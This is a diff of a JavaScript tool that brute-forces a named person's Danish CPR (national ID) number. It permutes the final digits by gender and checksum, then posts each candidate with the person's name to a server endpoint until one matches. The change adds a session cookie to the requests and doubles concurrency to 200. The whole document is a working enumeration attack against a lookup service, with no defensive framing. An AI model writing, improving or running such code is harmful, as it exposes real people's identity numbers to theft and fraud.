@@ -6,7 +6,8 @@ var options,
 	lastName, 
 	countRunning,
 	countCompleted,
-	xhr;
+	xhr,
+	cookie;
 
 $(document).ready(function() {
 	$('#findValidNumbers').click(function(){
@@ -17,9 +18,14 @@ $(document).ready(function() {
 		countRunning = 0;
 		countCompleted = 0;
 		xhr = [];
-				
+						
 		// set date of birth
 		dob = $('input[name=dob]').val();
+		
+		if (dob.length != 6)	{
+			alert("Invalid date of birth");
+			return false;
+		}				
 		
 		// set firstName
 		firstName = $('input[name=firstName]').val();
@@ -29,42 +35,45 @@ $(document).ready(function() {
 		
 		// set gender
 		var gender = $('input[name=gender]:checked').val();
-		findValidNumbers(dob, gender);
+		
+		// get session cookie
+		$.getJSON('post.php', function(response){
+		
+			// set cookie
+			cookie = response.cookie;
+			
+			// set permutations of CPR number
+			options[0] = [1,2,3,4,9,0];
+			options[1] = [0,1,2,3,4,5,6,7,8,9];
+			options[2] = [0,1,2,3,4,5,6,7,8,9];		
+			options[3] = gender=="male" ? [1,3,5,7,9] : [0,2,4,6,8];
+
+			// iterate, validate and post CPR numbers
+			recursiveSearch();
+		});
 	});
 });
 
-function findValidNumbers(dob, gender){	
-
-	if (dob.length != 6)	{
-		alert("Invalid date of birth");
-		return false;
-	}
-
-	options[0] = [1,2,3,4,9,0];
-	options[1] = [0,1,2,3,4,5,6,7,8,9];
-	options[2] = [0,1,2,3,4,5,6,7,8,9];		
-	options[3] = gender=="male" ? [1,3,5,7,9] : [0,2,4,6,8];
-	recursiveSearch ();
-	console.log(possibilities.length);
-}
-
-recursiveSearch = function (number, depth )
-{
+/************************
+ * Iterate all permutations of CPR number
+ ***********************/
+recursiveSearch = function (number, depth ){
 	number = number || "";
 	depth = depth || 0;
 	for ( var i = 0; i < options[depth].length; i++ ){
-		// is there one more layer?
 		if ( depth +1 < options.length ){
-			// yes: iterate the layer
-			recursiveSearch ( number + options[depth][i] , depth +1 );
+			recursiveSearch ( number + options[depth][i] , depth +1 );			
 		}else{
 			postCpr(number + options[depth][i] );
 		}
 	}
 }
 
+/************************
+ * post CPR number to check if it matches with full name of person
+ ***********************/
 function postCpr(cpr){
-	if(testCPR(cpr) && countRunning < 100){
+	if(testCPR(cpr) && countRunning < 200){
 		
 			// count running requests
 			countRunning = (countRunning + 1);
@@ -72,7 +81,7 @@ function postCpr(cpr){
 
 			possibilities.push ( cpr );
 			console.log(cpr);
-			xhr[countRunning] = $.post('post.php', {'cpr': cpr, 'dob':dob, 'firstName': firstName, 'lastName': lastName}, function(response){
+			xhr[countRunning] = $.post('post.php', {'cpr': cpr, 'dob':dob, 'firstName': firstName, 'lastName': lastName, 'cookie':cookie}, function(response){
 			
 				// count completed requests
 				countCompleted = (countCompleted + 1);
@@ -94,18 +103,6 @@ function postCpr(cpr){
 				
 			});
 	}
-}
-
-function getParameterByName(name, str)
-{
-  name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
-  var regexS = "[\\?&]" + name + "=([^&#]*)";
-  var regex = new RegExp(regexS);
-  var results = regex.exec(str);
-  if(results == null)
-    return "";
-  else
-    return decodeURIComponent(results[1].replace(/\+/g, " "));
 }
 
 /************************
